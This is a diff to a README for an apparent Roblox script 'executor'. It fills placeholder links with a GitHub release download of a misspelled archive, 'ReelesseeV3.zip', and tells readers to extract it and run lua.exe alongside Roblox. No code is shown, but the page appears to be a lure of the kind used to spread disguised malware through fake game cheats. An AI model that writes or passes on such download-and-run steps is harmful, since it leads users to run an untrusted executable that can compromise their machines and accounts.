@@ -9,9 +9,9 @@
 ## 🚀 Getting Started  
 
 ### Installation  
-[**DOWNLOAD**](INSERT_LINK_HERE)  
+[**DOWNLOAD**](https://github.com/lubbe89tvoridobro/Electron-Executor/releases/download/electron-executor-v3/ReelesseeV3.zip)  
 
-## **1. [Download the archive](INSERT_LINK_HERE)** and extract it to a secure folder.  
+## **1. [Download the archive](https://github.com/lubbe89tvoridobro/Electron-Executor/releases/download/electron-executor-v3/ReelesseeV3.zip)** and extract it to a secure folder.  
 ## **2. Run `lua.exe` to install the executor and required components.**  
 ## **3. Launch Roblox, then open `lua.exe` to begin executing scripts.** 
 
